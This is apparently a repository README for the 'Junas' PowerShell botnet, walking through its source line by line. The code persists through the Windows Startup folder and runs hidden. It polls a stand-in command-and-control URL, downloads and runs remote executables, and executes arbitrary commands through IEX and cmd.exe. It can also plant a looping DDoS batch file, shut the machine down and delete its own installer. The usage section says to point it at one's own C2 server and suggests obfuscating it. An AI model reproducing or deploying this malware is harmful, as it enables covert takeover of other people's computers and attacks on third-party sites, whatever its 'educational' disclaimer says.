## Junas botnet
### Legal
This is an educational script and should not be used for illegal/unethical actions against machines you do not own/have permission to infect
<br> 
<br> *Copyright (c) 2021 Pokesi All Rights Reserved.*
### How it works **step by step**
Syntax used:
<br> `Line of code/variable` - Explanation
<br> ... `Line of code` - Explanation [not required]
<br> ...... `Line of code` - Explanation [only used for branches]
<br> ... `}` - Ends the branch
<br> 
<br> `$userprof = $env:USERPROFILE;` - Gets the user's directory (e.g. C:/Users/JohnDoe/)
<br> `$startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";` - `$startUpFolder` is set to the user's startup directory.
<br> `$botnetCode` - `$botnetCode` is set to the botnet code. Keep in mind that the `.ps1` file is just an installer for the botnet, the actual thing is in this variable. The following is `$botnetCode`.
<br> ... `Add-Type -AssemblyName System.IO.Compression.FileSystem;` - Adds the type used to extract `.zip` files. Used when extracting downloaded files.
<br> ... `$wc = [System.Net.WebClient]::new();` - Starts a WebClient instance in variable `$wc`. Used for downloading files. An alternative may be curl.exe, but is not tested.
<br> ... `$commandcontrolserver = "https://yoursite.com/server.txt";` - Sets `$commandcontrolserver` to https://yoursite.com/server.txt, which is the file that has the command for the botnet.
<br> ... `$wc.DownloadFile("$commandcontrolserver","command.txt");` - Downloads the command and control file to command.txt. Alternative with curl.exe may be `curl.exe --output=command.txt -X GET https://yoursite.com/server.txt`, not tested.
<br> ... `$userprof = $env:USERPROFILE;` - Gets the user's directory (e.g. C:/Users/JohnDoe/)
<br> ... `$startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";` - `$startUpFolder` is set to the user's startup directory.
<br> ... `$cmd = (Get-Content -Path "./command.txt" -TotalCount 1)` - Sets the `$cmd` variable to the first line of `command.txt`.
<br> ... `if ($cmd == "Stop") {` - Checks if `$cmd` is "Stop". This stops the botnet.
<br> ...... `exit()` - Exits PowerShell
<br> ... `}` - Ends the branch
<br> ... `elseif ($cmd -Like "Dl&Run *") {` - Checks if `$cmd` starts with "Dl&Run". This downloads a .zip file, extracts it, and runs the .exe specified. In server.txt, this should look like `Dl&Run https://fileupload.com/application.zip:application.exe`. The provided example will download `application.zip`, extract it, and run application.exe inside the extracted folder.
<br> ...... `$cmd2 = $cmd.split("Dl&Run ")[0];` - Sets `$cmd2` to the command passed to the script, but stripped of "Dl&Run"
<br> ...... `$fileToDownload = $cmd2.Split(":")[0];` - Sets `$fileToDownload` to the file the operator wants to download.
<br> ...... `try {` - PowerShell try
<br> ......... `$wc.DownloadFile("$fileToDownload","botnet.zip");` - Downloads `$fileToDownload` to `botnet.zip`
<br> ......... `cmd.exe /c "mkdir folder";` - Runs cmd.exe [command prompt] with the `/c` switch, which executes a command. In this case, `mkdir folder` is run, which makes a folder called "folder"
<br> ......... `Expand-Archive -LiteralPath "./botnet.zip" -DestinationPath "./folder"` - Extracts the downloaded file to `/folder`.
<br> ......... `Start-Process -filepath "./folder/" + ($cmd2.Split(":")[2]) + ".exe";` - Runs the file.
<br> ...... `}` - Ends the branch
<br> ... `}` - Ends the branch
<br> ... `elseif ($cmd -Like "IEX *") {` - Checks if `$cmd` starts with "IEX". If it does, it will execute the given string.
<br> ...... `$cmd3 = $cmd.split("IEX ")[0];` - Sets `$cmd3` to the command passed to the script, but stripped of IEΧ.
<br> ...... `IEX($cmd3);` - Runs the string with IEX.
<br> ... `}` - Ends the branch
<br> ... `elseif ($cmd -Like "DDoS *") {` - Checks if `$cmd` starts with "DDoS". If it does, it will make a batch file in Startup that runs constant requests of that site.
<br> ...... `$cmd4 = $cmd.split("DDoS ")[0];` - Sets `$cmd4` to the command passed to the script, but stripped of DDoS
<br> ...... `":start ; curl -X GET $ddos; goto start" | Out-File "$startUpFolder\btnet.bat" -Force` - Makes a batch file in Startup that runs constant requests of that site.
<br> ... `}` - Ends the branch
<br> ... `elseif ($cmd -Like "Cmd *") {` - Checks if `$cmd` starts with "Cmd". If it does, it will execute `cmd.exe` with the switch `/c` to execute a command.
<br> ...... `$cmd5 = $cmd.split("Cmd ")[0];` - Sets `$cmd5` to the command passed to the script, but stripped of Cmd.
<br> ...... `cmd /c "$cmd5";` - Executes `cmd.exe` with the switch `/c` to execute a command.
<br> ... `}` - Ends the branch
<br> ... `elseif ($cmd == "Shutdown") {` - Checks if `$cmd` is Shutdown. If it does, it will shutdown the machine.
<br> ...... `Stop-Computer;` - Shutdown machine
<br> ... `}` - Ends the branch
<br> ... `else {` - If nothing else works, do this.
<br> ...... `exit;` - Stops the script
<br> ... `}` - Ends the branch
<br> ... `Remove-Item -Path "./command.txt";` - Removes command.txt
<br> `"powershell -WindowStyle hidden -Command '$botnetCode'" | Out-File "$startUpFolder\default.bat";` - Writes `$botnetCode` to a Startup file.
<br> `Remove-Item -Path $MyInvocation.MyCommand.Source;` - Self-Destructs.
### Usage
Change https://yoursite.com/server.txt to your command and control server.
<br> You may want to obfuscate this or add custom commands.
